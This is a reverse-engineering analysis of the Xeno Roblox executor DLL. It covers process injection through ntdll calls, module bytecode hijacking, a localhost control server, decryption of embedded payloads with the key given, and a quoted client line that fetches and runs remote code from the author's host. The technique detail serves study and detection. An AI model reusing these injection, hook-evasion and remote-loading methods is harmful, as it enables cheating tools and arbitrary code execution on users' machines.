# Technical Deep Dive — TEST.dll (Xeno v1.3.65)

Reconstructed code, internal structures, and execution flows recovered by static disassembly (capstone) and string analysis. Pseudocode is reconstructed from the actual instruction stream; where a detail is inferred rather than proven, it is marked *(inferred)*. All RVAs are relative to the preferred image base `0x180000000`.

---

## 1. Binary layout

```
.text   VA=0x1000    VS=0x1A948B   — code (1.7 MB)
.rdata  VA=0x1AB000  VS=0x69004    — strings, vtables, import tables
.data   VA=0x215000  VS=0x3F124    — globals (large BSS: client list, server state, caches)
.pdata  VA=0x255000  VS=0xCE94     — unwind info (intact C++ EH)
.rsrc   VA=0x262000  VS=0x16440    — manifest + 2 encrypted payload resources
.reloc  VA=0x279000  VS=0x15EC     — relocations
```

Entry point `0x199A60` (standard CRT `DllMain` startup). No packing, no anti-disassembly tricks — MSVC `/O2`-style output with heavy inlining.

---

## 2. Exported functions — disassembly and reconstruction

### 2.1 `Version` — RVA `0x18D3E0`

```asm
cmp  qword [rip+0x8AD70], 0xF        ; std::string SSO: size/capacity check
lea  rax, [rip+0x8AD51]              ; "v1.3.65" (short-string buffer)
cmova rax, [rip+0x8AD49]             ; if heap-allocated, load pointer instead
ret
```

Reconstruction — the classic MSVC `std::string::c_str()` on a global:

```cpp
static const std::string g_version = "v1.3.65";

extern "C" __declspec(dllexport)
const char* Version() {
    return g_version.c_str();
}
```

### 2.2 `Attach` — RVA `0x18D3D0`

```asm
xor ecx, ecx              ; arg = false
jmp 0x18018C040           ; tail call -> internal_attach(bool)
```

```cpp
extern "C" __declspec(dllexport)
void Attach() {
    internal_attach(false);   // false = initial attach (not a silent re-attach)
}
```

### 2.3 `Execute` — RVA `0x18D400`

Key instructions (prologue trimmed):

```asm
mov  r14, r8                    ; r14 = count
mov  r15, rdx                   ; r15 = pid array
mov  r12, rcx                   ; r12 = script
...
loop:
mov  esi, dword [r15 + rbp*4]   ; pid = pids[i]        (32-bit PIDs)
lea  rcx, [rip+0x893C2]         ; global / string arg
call qword [rip+0x1E194]        ; validate / resolve   (import thunk)
test eax, eax
jne  <skip>
mov  eax, dword [rip+0x893FA]   ; g_serverState sentinel
cmp  eax, 0x7FFFFFFF            ; INT_MAX = "not initialized/shutting down"
je   <abort>
mov  rbx, qword [rip+0xC4EF4]   ; g_clients.begin()
mov  rdi, qword [rip+0xC4EF5]   ; g_clients.end()
scan:
mov  rcx, [rbx]                 ; client object (shared_ptr-held)
cmp  dword [rcx + 0x2D0], esi   ; client->pid == pid?   (PID at +0x2D0)
jne  <next>
mov  rcx, [rcx]                 ; deref
lea  rdx, [rsp+0x50]            ; &std::string(script)
call qword [rip+0x1DE2F]        ; client->QueueScript(script)
```

Reconstruction:

```cpp
extern "C" __declspec(dllexport)
int Execute(const char* script, const int* pids, size_t count) {
    if (g_serverState == INT_MAX)            // server not ready
        return ERROR_NOT_READY;

    int delivered = 0;
    for (size_t i = 0; i < count; ++i) {
        int pid = pids[i];
        if (!validate_pid(pid))              // via helper at import thunk
            continue;
        for (auto& client : g_clients) {     // global vector<shared_ptr<RBXClient>>
            if (client->pid /* +0x2D0 */ == pid) {
                client->QueueScript(script); // posts to the client's request queue
                ++delivered;
            }
        }
    }
    return delivered;
}
```

### 2.4 `GetClients` — RVA `0x18D610`

```asm
mov  rax, qword [rip+0xC4D38]     ; g_clients.begin
cmp  qword [rip+0xC4D29], rax     ; == end? -> return empty
...
mov  ecx, dword [rip+0xC490E]
mov  rax, qword gs:[0x58]         ; TLS array (InitOnce/SRWLock init)
...
call 0x180171920                  ; acquire shared lock
mov  rbx, [rip+0xC4CD8]           ; g_clients.begin()
mov  rsi, [rip+0xC4CD9]           ; g_clients.end()
walk:
mov  rdi, [rbx]
cmp  qword [rdi + 0x2C0], 0       ; client->hProcess/attached != null?
je   <skip>
mov  edi, dword [rdi + 0x2D0]     ; pid
...                               ; append to output
```

Reconstruction:

```cpp
extern "C" __declspec(dllexport)
<list-type> GetClients() {
    std::shared_lock lock(g_clientsMutex);          // SRWLock, lazily InitOnce'd
    std::vector<int> out;
    for (auto& client : g_clients)
        if (client->hProcess /* +0x2C0 */ != nullptr)
            out.push_back(client->pid /* +0x2D0 */);
    return out;                                      // serialized for the caller
}
```

### 2.5 `SetSetting` — RVA `0x18D950`

```asm
test ecx, ecx
je   <case 0>              ; setting id 0
cmp  ecx, 1
jne  <invalid>             ; only 0 and 1 known
; --- case 1: Discord RPC toggle ---
cmp  byte [rip+0xC4616], 0
jne  <already>
lea  rax, [rip+0x511B7]    ; "RPC is Enabled"
mov  byte [rip+0xC4603], cl
...                        ; log("RPC is Enabled" / "RPC was disabled")
```

```cpp
enum XenoSetting { Setting_0 /*unknown*/, Setting_DiscordRpc = 1 };

extern "C" __declspec(dllexport)
void SetSetting(int id, bool value) {
    switch (id) {
    case Setting_DiscordRpc:
        if (!g_rpcInitialized) {
            g_rpcEnabled = value;
            log(value ? "RPC is Enabled" : "RPC was disabled");
            // starts/stops DiscordRPC thread ("SET_ACTIVITY", "{} requested to join")
        }
        break;
    case 0: /* second setting, handler at 0x18DD10 */ break;
    default: /* invalid */ break;
    }
}
```

### 2.6 `Initialize` — RVA `0x18CA80`

```asm
movzx ebx, cl                       ; bool arg (show console)
xor   ecx, ecx
call  [rip+0x1F2A5]                 ; console/CRT init
movzx ecx, bl
mov   [rip+0xC553B], rax
call  0x180189210                   ; early init; test al,al / je fail
lea   rcx, [rip+0x4F17F]            ; "ntdll.dll"
call  [rip+0x1E801]                 ; LoadLibraryA
test  rax, rax / jne ok
; else log("Failed to load ntdll.dll") and bail
ok:
lea  rdx, [rip+0x4F0FD]  "NtUnlockVirtualMemory"  -> GetProcAddress -> g_NtUnlockVirtualMemory
lea  rdx, [rip+0x4F0D5]  "NtLockVirtualMemory"    -> ...            -> g_NtLockVirtualMemory
lea  rdx, [rip+0x4F0A6]  "NtSuspendProcess"       -> ...            -> g_NtSuspendProcess
lea  rdx, [rip+0x4F07F]  "NtResumeProcess"        -> ...            -> g_NtResumeProcess
lea  rdx, [rip+0x4F050]  "NtReadVirtualMemory"    -> ...            -> g_NtReadVirtualMemory
lea  rdx, [rip+0x4F021]  "NtWriteVirtualMemory"   -> ...            -> g_NtWriteVirtualMemory
; continues: directory setup, cache load, offset download, server start
```

```cpp
extern "C" __declspec(dllexport)
bool Initialize(bool showConsole) {
    g_console = InitConsole(showConsole);
    if (!EarlyInit()) return false;

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) { log("Failed to load ntdll.dll"); return false; }

    g_NtUnlockVirtualMemory = (fn)GetProcAddress(ntdll, "NtUnlockVirtualMemory");
    g_NtLockVirtualMemory   = (fn)GetProcAddress(ntdll, "NtLockVirtualMemory");
    g_NtSuspendProcess      = (fn)GetProcAddress(ntdll, "NtSuspendProcess");
    g_NtResumeProcess       = (fn)GetProcAddress(ntdll, "NtResumeProcess");
    g_NtReadVirtualMemory   = (fn)GetProcAddress(ntdll, "NtReadVirtualMemory");
    g_NtWriteVirtualMemory  = (fn)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    // any missing symbol -> "A symbol was unable to be loaded from ntdll.dll"

    EnsureXenoDirectory();        // waits for loader to create "Xeno" dir
    LoadCache();                  // RBXClients, RBXBytecode, RBXMFlags, RBXClientInfos
    FetchRBXClientData();         // offsets from primary endpoint, fallback x3no.pages.dev
    StartXenoServer();            // localhost HTTP + WebSocket threads
    StartClientChecker();         // process scan / re-attach thread
    return true;
}
```

**Why `Nt*` and not `ReadProcessMemory`?** Calling `ntdll` natives directly sidesteps user-mode hooks that security products (and Roblox's own checks) place on the `kernel32`/`kernelbase` wrappers. The DLL imports the Win32 versions too, but the attach path was built to have the direct-syscall option.

---

## 3. Internal object model (recovered field map)

From the disassembly above, the `RBXClient` object layout includes:

```cpp
struct RBXClient {                        // heap object, held via shared_ptr
    /* +0x000 */ void* vtable;            // virtual QueueScript/Request dispatcher
    /* ...    */
    /* +0x2C0 */ HANDLE hProcess;         // null => client dead/detached
    /* +0x2D0 */ uint32_t pid;            // Roblox client PID (compared in Execute/GetClients)
    /* +0x318 */ uint32_t state;          // == 1 => ready/attached (checked in internal_attach)
    /* ...    */
};
static std::vector<std::shared_ptr<RBXClient>> g_clients;   // globals near 0x214000
static std::shared_mutex g_clientsMutex;                    // SRWLock + InitOnce
static std::atomic<int> g_serverState;                      // INT_MAX sentinel = not ready
```

Related log-confirmed methods: `RBXClient::Loadstring`, `::UnlockModule`, `::LockModule`, `::CRefresh`, `::HandleAutoExecute`, `::PlayerRemoving`, destructor `~RBXClient` (`"Client was closed and cleaned up successfully"`).

---

## 4. The attach flow (state machine reconstructed from ordered log strings)

```
internal_attach(false)
│
├─ 1. Find Roblox processes  (CreateToolhelp32Snapshot / Process32FirstW)
│     └─ for each: "Creating new RBXClient: {pid}"
│        • admin check: "Failed to open the Roblox client process because it is
│          running with administrator privileges..."
│        • cached fast-path: "Reattaching to cached client PID: {}"
│
├─ 2. Wait for the game window  (EnumWindows / GetWindowThreadProcessId)
│     "Waiting for Client Window" → "Client window is now available"
│     or "Timeout ({}s) exceeded while waiting for window"
│
├─ 3. Locate the module to hijack (reads client memory via NtReadVirtualMemory)
│     "RobloxGui" → "Modules" → en-us locale translation ModuleScript
│     failures: "Could not find RobloxGui->Modules. Going back to in-game check..."
│               "Could not find en-us locale translation module..."
│
├─ 4. Hijack: NtSuspendProcess(pid)
│     UnlockModule → overwrite module bytecode (SetBytecode/SetScriptBytecode)
│     via NtWriteVirtualMemory → LockModule → NtResumeProcess(pid)
│     "Intercepted translation module @{:#x}"
│     • offsets come from remote RBXClient data (§6); wrong offsets nearly crash
│       the game: "{} offsets are invalid and almost crashed Xeno..."
│
├─ 5. Handshake: injected module connects back to the localhost Xeno Server
│     "Attach ping received from client "{}", This indicates everything was successful."
│     fallback ladder if no ping:
│       a. "Using RefreshRBXWindowV2..."  (force window repaint, §7)
│       b. "Attempting to restart current thread..."
│       c. "Treating this as failed."
│
├─ 6. Post-attach jobs
│     • "Client was already attached, handling important core functions for the client :D"
│     • autoexec: "[::HandleAutoExecute]: Executed {} script(s) from autoexec directory"
│     • teleport queue restore: "Loaded {} Cached queued scripts for QueueOnTeleport"
│
└─ 7. Lifetime management (Client Checker thread)
      "Removed RBXClient: {}" / "[::~RBXClient]: Client was closed and cleaned up..."
      teleport re-attach: "[::PlayerRemoving]: Player leaving ping recieved. We have to reattach."
```

### Why hijack a translation module?

A ModuleScript inside `RobloxGui` already runs inside the game's Luau VM with CoreGui-level (high) privileges. By replacing its bytecode, Xeno's payload inherits a legitimate, scheduled Luau thread — there is no foreign thread, no new memory section with RWX, and no injected DLL for Roblox's integrity checks to find. The only writes are to existing data structures (the module's bytecode pointer/data), which is far stealthier than `VirtualAllocEx` + `CreateRemoteThread`. *(This rationale is inferred from the technique; the binary's actions themselves are confirmed by strings and imports.)*

---

## 5. Execution flow — complete pipeline (confirmed by DLL + CLIENT.LUA)

Execution has **two entry paths**, both ending at the same primitive: *patch a client-created ModuleScript's bytecode, let the game `require()` it*.

### 5.1 Entry path A — `Execute()` export (UI → game)

```
Loader/UI                 TEST.dll (Xeno Server)                Roblox process
    │  Execute(script, [pid], 1)        │                              │
    │─────────────────────────────────► │ match pid in g_clients       │
    │                                   │ client->QueueScript(script)  │
    │                                   │                              │ ExecutionListener loop:
    │                                   │                              │  create ModuleScript named
    │                                   │                              │  math.random(1,9999999),
    │                                   │                              │  parent = CoreGui\<pid>
    │                                   │ ◄── POST /f?e=20 (Unlock ────│  then require() every 1 ms
    │                                   │      CustomBytecode)         │
    │                                   │ 1. find module via           │
    │                                   │    GetInstanceFromObjectValue│
    │                                   │    (DataModel walk into the  │
    │                                   │    client container)         │
    │                                   │ 2. compile queued script:    │
    │                                   │    embedded Luau compiler,   │
    │                                   │    wrapper prepended (below) │
    │                                   │ 3. NtWriteVirtualMemory the  │
    │                                   │    new bytecode over the     │
    │                                   │    module's bytecode         │
    │                                   │ 4. read back & VERIFY —      │
    │                                   │    "Could not verify that    │
    │                                   │    the execution module      │
    │                                   │    has changed..."           │
    │                                   │                              │ require() now returns a
    │                                   │                              │ function → setfenv(fn, Xeno)
    │                                   │ ◄── POST /f?e=21 (Lock ──────│  → task.spawn(fn)
    │                                   │      CustomBytecode)         │  → regenModule(), loop
```

Key detail: the client **never sends the module's identity** for op 20 — the DLL finds the module itself by walking the DataModel into `CoreGui\<pid>` (`[::Loadstring]: Could not find the ModuleScript with the given name "{}"` shows name-based lookup is used where a name is known; for the execution module it scans the container). The 1 ms `require()` poll is the synchronization: `require` only returns a function once the DLL's write has landed.

### 5.2 Entry path B — `Xeno.loadstring()` (script → compile service)

A third HTTP endpoint exists purely for compilation: **`POST /ls?c=<moduleName>&p=<pid>`**.

```lua
-- payloads/xeno_client.lua:1994 (abridged)
local module = Instance.new("ModuleScript")
module.Name = "loadstring:" .. math.random(1, 1000000)
module.Parent = LoadstringContainer                 -- CoreGui\<pid>\Loadstring

local result, success, status = RServer({0, content,
    Urls.Server .. "/ls?c=" .. module.Name .. "&p=" .. XENO_PID}, nil, nil, true)
-- status 400 -> compile error (message returned to the caller)
-- status 500 -> server-side failure

while true do                                       -- handshake poll, 3 s timeout
    local ok, container = pcall(function()
        RServer({XFS.UnlockCustomBytecode}, true)   -- op 20
        local res = require(module)
        RServer({XFS.LockCustomBytecode}, true)     -- op 21
        return res
    end)
    if ok and type(container) == "table"
       and type(container[XENO_PID]) == "function" then
        return container[XENO_PID]                  -- the compiled chunk
    end
    if tick() - start > 3 then return nil, "Timeout" end
    task.wait(.05)
end
```

Note the contract difference from path A: a loadstring module's patched bytecode returns a **table keyed by PID** (`{[pid] = function}`), so several clients/scripts can't cross-consume each other's chunks. `queue_on_teleport` and `setclipboard` also have their own endpoints: **`POST /qt?p=<pid>`** and **`POST /cb`**.

### 5.3 The compile step (DLL side)

- The DLL embeds the **full Luau compiler** (all `LuauCompile*` FFlags; error strings like `"Exceeded constant limit; simplify the code to compile"`).
- User source is wrapped before compilation (verbatim wrapper below) so the chunk self-installs the `Xeno` environment and a fake `script` global.
- Compile failures are reported verbatim: `"[{}]: Failed to compile (this is a problem with your script): {}"` → HTTP 400 on `/ls`.
- A second wrapper (`return function(...)error([[ ... ]])`) is the error-trap chunk.
- Compiled bytecode is cached (`RBXBytecode` in the cache file) so repeat executions skip recompilation.

### 5.4 The patch step (DLL side)

1. `GetInstanceFromObjectValue` resolves the container name to the live ModuleScript address (per-op log family: `[::SetBytecode]`, `[::GetBytecode]`, `[::LockModule]`, `[::UnlockModule]`, `[::RestoreBytecode]` — all with `"returned 0 for container: '{}'"` failure lines).
2. Bytecode memory is located via the per-version offsets (RBXClient data, §6).
3. `NtWriteVirtualMemory` replaces the bytecode (process may be suspended first via `NtSuspendProcess`).
4. **Read-back verification:** `"[{}]: Could not verify that the execution module has changed. Script may not be executed! (Your Roblox client cannot keep up and may be overloaded)"` — if the game's allocator moved the object mid-write, the patch is aborted instead of crashing the client.
5. Integrity on restore: `"Restored data doesn't match checksum"` — original bytecode is checksummed before patching so restores are verifiable.

### 5.5 BytecodePatchWatcher (new in v1.3.65 — not in v1.3.40)

A dedicated watchdog thread (`"Bytecode Patch Watcher thread: {:#x}"`) tracks patched modules. If the game hasn't consumed a patch within a threshold — i.e. the client-side workers didn't run and didn't call restore — it **automatically restores the original bytecode**: `"[::BytecodePatchWatcherT]: Threshold reached. Workers failed to call restore (Automatically restoring to prevent crash)"`. Purpose: leaving foreign bytecode sitting in a live module is both detectable and crash-prone; the watcher bounds that window. For defenders, this means patched-bytecode evidence is *transient* — memory-scanning for it must catch the window between patch and restore.

### 5.6 Execution endpoints — final endpoint table

| Endpoint | Method | Purpose |
|---|---|---|
| `/f?e=<0-21>` | POST JSON `{c,p}` | opcode dispatch (files, bytecode get/set/restore, module lock/unlock, signals, …) |
| `/ls?c=<name>&p=<pid>` | POST raw | compile source → patch named loadstring module (400 = compile error, 500 = server error) |
| `/rq?c=<m>&h=<b64>&u=<b64>` | POST raw | HTTP proxy for script `request()` |
| `/qt?p=<pid>` | POST raw | `queue_on_teleport` — stash source in the teleport queue |
| `/cb` | POST raw | `setclipboard` — write OS clipboard |

### 5.7 Teleport queue & autoexec in v1.3.65

In the current `CLIENT.LUA`, the **teleport-queue restore and autoexec blocks are commented out** (`--[[ ]]`), though the DLL still logs `"Loaded {} Cached queued scripts for QueueOnTeleport"` and `"[::HandleAutoExecute]: Executed {} script(s)"` — the DLL-side machinery is live; the client-side replay is temporarily disabled. `queue_on_teleport` still *stores* scripts via `/qt`, they just aren't auto-replayed by this client build.

### 5.8 The loadstring wrapper (verbatim, `.rdata`)

```lua
return function(...)
    for i,v in getfenv().Xeno do getfenv(0)[i]=v end
    local e={}
    setmetatable(e, {__index = getfenv().Xeno})
    setfenv(1,e)
    local s=Instance.new('LocalScript')
    getfenv(1).script=s
    setfenv(0, getfenv(1));
    -- <user source appended>
```

What this does, line by line:

1. Copies every function in the `Xeno` table into the global env (`getfenv(0)`), so user scripts call `WebSocket`, `ReadFile`, etc. unprefixed.
2. Builds a per-script environment `e` that falls back to `Xeno` via `__index` — script-local globals don't leak across scripts.
3. Creates a fake `LocalScript` and exposes it as the `script` global so scripts referencing `script.Parent` etc. don't immediately error.
4. `setfenv(0, ...)` installs the env at the thread level before the user chunk body runs.

A second wrapper (`return function(...)error([[ ... ]])` with an empty body) is the trap used to surface compile/runtime errors back to the DLL (`"[{}]: Failed to compile ..."`).

Script-environment functions identified in the binary:

| Category | Names |
|---|---|
| Execution | `Loadstring`, `QueueOnTeleport` / `SetQueueOnTeleport` |
| Network | `Request`, `WebSocket`, `OpenUrl` |
| Filesystem | `ReadFile`, `WriteFile` |
| Console | `RConsole`, `Console` |
| Encoding/crypto | `Base64`, `Crypt`, `zstd` |
| Reflection/internals | `GetBytecode`, `SetBytecode`, `SetScriptBytecode`, `SetScriptable`, `HookInstance`, `GetService`, `GetRBXSignals`, `GetFunctions`, `GetProperties`, `GetInstanceFromObjectValue`, `SaveScriptProfilingData`, `ExecuteJavaScript` |

`GetBytecode`/`SetScriptBytecode`/`HookInstance` being exposed to scripts means the same module-hijack primitive the DLL uses internally is also handed to user scripts.

---

## 6. Remote offsets & update-resilience system

Roblox ships frequent builds; hardcoded internal offsets would break weekly. Xeno solves this at runtime:

```cpp
void FetchRBXClientData() {
    auto data = curl_get(PRIMARY_ENDPOINT);                 // embedded URL
    if (!data || zstd_decompress(*data).failed()) {
        log("Primary endpoint failed / decompression failed. Using secondary endpoint");
        data = curl_get("https://x3no.pages.dev/ep.zst.enc"); // confirmed string
    }
    auto json = parse(*data);   // "Failed to parse RBXClient data: ..."
    ApplyOffsets(json);         // keyed by Roblox version hash ("version-xxxx")
}
```

Offset application logic (from strings):

- Exact match on the client's version string → apply.
- Alias entries: `"Offsets for version "{}" points to "{}""` — one version can redirect to another's offsets.
- Ultimate fallback: the `'default'` offsets index, with a plea to report it to the author.
- Failure mode: `"{} offsets are invalid and almost crashed Xeno. Please update your client..."` — i.e. the DLL guards its writes against obviously bad offsets, but only heuristically.

The secondary URL path `ep.zst.enc` is self-describing: **e**xternal **p**ayload, **zstd**-compressed, **enc**rypted.

---

## 7. `RefreshRBXWindowV2` — the re-render trick

When the injected module doesn't check in, Xeno forces the Roblox window to repaint, which makes the game re-run rendering scripts — another chance for the hijacked module to fire. This explains the otherwise odd import list:

```cpp
// imports: GetForegroundWindow, SetForegroundWindow, GetWindowRect,
//          SetWindowPos, RedrawWindow, SetWindowLongPtrW, DwmSetWindowAttribute,
//          LockWindowUpdate, IsZoomed, MonitorFromWindow, SetWindowPlacement
void RefreshRBXWindowV2(HWND hwnd) {                       // (reconstructed)
    LockWindowUpdate(hwnd);
    // nudge style/position: minimize-restore or off/on-screen move
    SetWindowPos(hwnd, ..., SWP_FRAMECHANGED);
    RedrawWindow(hwnd, nullptr, nullptr, RDW_INVALIDATE | RDW_ALLCHILDREN);
    DwmSetWindowAttribute(hwnd, DWMWA_*, ...);
    LockWindowUpdate(nullptr);
}
```

There is also a data-model refresh path inside the client (`[::CRefresh]: Client DataModel refreshed`, `"DataModel is being loaded..."`) for the same purpose at the Roblox level.

---

## 8. Encrypted resource payloads — SOLVED

Two blobs in `.rsrc`, custom type `8194`:

| Resource | Size (enc) | Magic | Decrypted (zstd) | Content |
|---|---|---|---|---|
| `8194/8192/1033` | 27,985 | `16 48 7F B8` | 145,004 B | **`CLIENT.LUA`** — Xeno client init script |
| `8194/8196/1033` | 62,613 | `16 48 7F B8` | 336,884 B | **Roblox en-us translation table** (original module content) |

### 8.1 The decryption routine (`.text:0x1906B0`)

`LoadResource`/`SizeofResource`/`LockResource` (at `0x18CD06-0x18CD7F`) wrap the blob in a `std::string`, then `0x1906B0` transforms it. The cipher is a **repeating-key XOR**:

```asm
0x190737: mov   r8,  [rip+0xC25DA]   ; key.begin   (global pair @ 0x252D18/0x252D20)
0x19073e: mov   rcx, [rip+0xC25DB]   ; key.end
0x190745: sub   rcx, r8              ; keylen = 32
0x190748: xor   edx, edx
0x19074a: mov   rax, r9              ; i
0x19074d: div   rcx                  ; rdx = i % 32
0x190750: movzx ecx, byte [r10+r9]   ; ciphertext[i]
0x190755: xor   cl, byte [rdx+r8]    ; ^= key[i % 32]
0x19075d: mov   [rax+r9], cl         ; plaintext[i]
```

The key pointers live in zero-initialized `.data`; they are populated by a dynamic initializer at **`.text:0x3B10`** that `malloc(0x20)`s a buffer and stores eight little-endian dwords:

```
0x4550FD3E 0xCABF61ED 0x92A1EF57 0x966607D0
0x21F7C5FD 0x3649BD12 0x19B33F7A 0xBBF52AA9
```

→ **32-byte key:** `3E FD 50 45 ED 61 BF CA 57 EF A1 92 D0 07 66 96 FD C5 F7 21 12 BD 49 36 7A 3F B3 19 A9 2A F5 BB`

After the XOR, the code verifies the buffer starts with the **zstd frame magic** (`0x1908DD: cmp ecx, 0xFD2FB528`, built big-endian from `28 B5 2F FD`), calls `ZSTD_getFrameContentSize` (`0x1800E0830`), allocates the frame size, and `ZSTD_decompress`es (`0x1800E0CD0`). Decompress failures produce `"Could not decompress a Xeno resource: {}"` with `ZSTD_getErrorName`.

Full pipeline (reconstructed):

```cpp
std::string LoadXenoResource(int resourceId) {
    HRSRC hRes  = FindResourceW(g_hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA /*8194*/);
    HGLOBAL hDat = LoadResource(g_hModule, hRes);
    DWORD   size = SizeofResource(g_hModule, hRes);
    void*   ptr  = LockResource(hDat);
    if (!ptr || !size) { log("A Xeno client resource is invalid"); return {}; }

    std::string enc((char*)ptr, size);
    static const uint8_t key[32] = { 0x3E,0xFD,0x50,0x45,0xED,0x61,0xBF,0xCA,
                                     0x57,0xEF,0xA1,0x92,0xD0,0x07,0x66,0x96,
                                     0xFD,0xC5,0xF7,0x21,0x12,0xBD,0x49,0x36,
                                     0x7A,0x3F,0xB3,0x19,0xA9,0x2A,0xF5,0xBB };
    for (size_t i = 0; i < enc.size(); ++i)
        enc[i] ^= key[i % 32];                                   // .text:0x190737

    if (strncmp(enc.data(), "\x28\xB5\x2F\xFD", 4) != 0) {       // .text:0x1908DD
        log("Failed to retrieve a Xeno resource."); return {};
    }
    size_t cap  = ZSTD_getFrameContentSize(enc.data(), enc.size());
    std::string out(cap, 0);
    size_t r = ZSTD_decompress(out.data(), cap, enc.data(), enc.size());
    if (ZSTD_isError(r)) { log("Could not decompress a Xeno resource: {}",
                               ZSTD_getErrorName(r)); return {}; }
    return out;
}
```

**Key confirmation:** known-plaintext attack independently derived keystream bytes `3E FD 50 45` for offset 0 (assuming zstd magic) — byte-identical to the initializer key. Standalone decryptor: `tools/decrypt_resources.py`.

### 8.2 Resource `8192` = `CLIENT.LUA` (the injected brain)

Extracted to `payloads/xeno_client.lua` (4,874 lines). Header is self-identifying:

```lua
--[[ v1.3.65 CLIENT.LUA -- POST OPEN SOURCE
Xeno is only maintained and developed by Rizve. ...
Credits:
- Quivings (https://getsolara.dev/): ProxyService; Mock Service (vulnerabilities mitigation).
- razzoni: Few function improvements and suggestions. ]]
```

It confirms and completes the architecture:

- **Attach target:** `if xRenv.script.Name == "en-us"` — the hijacked module is the en-us locale translation ModuleScript. Resource `8196` is the original translation table, kept so the module still answers translation lookups normally (`return setmetatable(A,{__index=function()return''end})`) — the game sees no functional difference.
- **Footprint in the game:** a `CoreGui` folder named `%XENO_CLIENT_PID%` containing `Pointer`/`Loadstring` subfolders, a `Message` instance named `DO NOT DELETE: BELONGS TO XENO`, and the global `shared.__Xeno`.
- **ExecutionListener (the execute loop):**

```lua
local ExecutionModule = Instance.new("ModuleScript")
ExecutionModule.Name = math.random(1, 9999999)
ExecutionModule.Parent = XenoContainer
while true do
    local success, execFunc = pcall(require, ExecutionModule)
    if success and type(execFunc) == "function" then
        -- DLL swapped this module's bytecode with the compiled user script
        setfenv(execFunc, { getfenv=..., setfenv=..., setmetatable=..., error=..., Xeno = Xeno })
        task.spawn(execFunc)
        RServer({XFS.LockCustomBytecode}, true)   -- tell DLL to stop overwriting
        regenModule()
    end
    task.wait(0.001)
end
```

  The DLL side (`Execute` export) compiles the user script with its embedded Luau compiler and writes the bytecode into the module (opcodes 20/21); the client merely `require()`s in a tight loop until a function pops out.
- **Remote code execution channel:** on every attach it runs
  `Xeno.loadstring(RawHttpGet("https://x3no.pages.dev/code.lua"), "XenoNotification")` with the full Xeno env — the author can push arbitrary code to every live session. `version.txt` on the same host drives the "[Xeno Updated]" nag notification.
- **UNC honesty note (author's own words):** *"I apologize for UNC functions that are fake / not working as I would like more scripts being able to run (wont run properly though)"* — several API functions are deliberate stubs.
- `saveinstance` is fetched live from GitHub (`luau/SynSaveInstance`).

### 8.3 Resource `8196` = en-us translation table

336,884 bytes of genuine Roblox locale data (`["Xbox.Old.ActiveUserLostConnectionPhrase"]=...`). Bundled so the hijacked `en-us` module keeps serving translations; also useful as a pristine reference when restoring/relocking module bytecode (`RestoreScriptBytecode`, opcode 10).

---

## 9. Localhost server & IPC — protocol recovered from `CLIENT.LUA`

- `cpp-httplib` server on `http://localhost:<port>` (port passed via `%XENO_SERVER_PORT%`; the fixed/dev port **3110** is hard-blocked client-side: `"Not allowed to send request to Xeno server"`).
- **Function endpoint:** `POST /f?e=<opcode>` with JSON body `{ "c": <arg>, "p": <pid>? }`. Response 200-299 = success; `410` treated as "Xeno was closed". The opcode enum (`XFS`, from the client source):

| Op | Name | Op | Name |
|---|---|---|---|
| 0 | `Activate` (returns HWID) | 11 | `LockModule` |
| 1 | `ReadFile` | 12 | `UnlockModule` |
| 2 | `GetFileType` | 13 | `GetProperties` |
| 3 | `ListFiles` | 14 | `GetInstanceRBXSignals` |
| 4 | `MakeFolder` | 15 | `GetInstanceFunctions` |
| 5 | `DelFolder` | 16 | `HookInstance` |
| 6 | `DelFile` | 17 | `SetScriptable` |
| 7 | `GetCustomAsset` | 18 | `GetInstanceAddress` |
| 8 | `GetScriptBytecode` | 19 | `PlayerRemoving` |
| 9 | `SetScriptBytecode` | 20 | `UnlockCustomBytecode` |
| 10 | `RestoreScriptBytecode` | 21 | `LockCustomBytecode` |

  (`WriteFile = -1` exists only client-side; the C++ server never receives it — large writes are staged client-side.)
- **HTTP proxy endpoint:** `POST /rq?c=<methodId>&h=<base64(JSON headers)>&u=<base64(url)>` with the raw body as POST data — the DLL performs the request with libcurl, which is how user scripts bypass Roblox's HttpService restrictions and why requests carry `roblox-place-id`, `roblox-game-id`, `roblox-session-id` headers.
- **Execution endpoints:** `/ls` (compile service), `/qt` (teleport queue), `/cb` (clipboard) — full table in §5.6.
- This matches the 17 `XenoServer` handler lambdas seen in RTTI (`.?AV<lambda_1..17>...httplib::Request...`).
- Server-side log confirms the serving model: `"[::Loadstring]: DataModel was finished loading. Serving loadstring request"` — the in-game module *pulls* work from the server rather than the server pushing.
- Named pipes (`WaitNamedPipeW`, `PeekNamedPipe`) provide the UI ↔ DLL channel *(inferred)*; WebSocket channels exist for both user scripts and internal messaging, with ping/pong keepalive (`"pong timeout"`, `"Ping timeout"`).

---

## 10. Cache format (behavioral)

Persisted across runs, one binary cache file in the Xeno directory:

```
header                    — validated: "Invalid or corrupted cache header (file: {})"
RBXClient PIDs[]          — "Failed to write RBXClient PID {} to cache"
RBXBytecode[]             — previously compiled/fetched bytecode
RBXMFlags[]               — cached Roblox FFlags
RBXClientInfos[]          — per-client metadata
Queued teleport scripts   — "Loaded {} Cached queued scripts for QueueOnTeleport"
```

On boot: `"Loaded existing cache: {} RBXClients, {} RBXBytecode, {} RBXMFlags, {} RBXClientInfos"`; a corrupt/missing cache is non-fatal (`"No valid cache found (Starting new fresh cache)"`).

---

## 11. Technique inventory (MITRE-style)

| Technique | Implementation in binary |
|---|---|
| Process injection (T1055) | `NtSuspendProcess` + `NtWriteVirtualMemory` into Roblox; module bytecode overwrite |
| Hijack execution flow (T1574) | Replacement of a CoreGui ModuleScript's bytecode instead of foreign threads |
| Direct native API use | `Nt*` resolved manually from `ntdll.dll` — evades kernel32 user-mode hooks |
| Encrypted payloads (T1027/T1140) | Resources `8194/8192`, `8194/8196` (~8.0 entropy); remote `ep.zst.enc` |
| C2 over loopback (T1071/T1090) | cpp-httplib HTTP + WebSocket server on `localhost` |
| Ingress tool transfer (T1105) | curl/OpenSSL downloads of offsets & payloads at runtime |
| System information discovery | HWID via `GetCurrentHwProfileW`; process/window enumeration |
| Input/clipboard manipulation | `keybd_event`, `mouse_event`, clipboard APIs |
| Anti-forensics (weak) | Forged future compile timestamp; unsigned binary; no PDB shipped |
| Persistence (weak, per-session) | Cache file for re-attach; autoexec directory for auto-run scripts |

---

## 12. Resolution status after payload recovery

Round 2 closed almost everything:

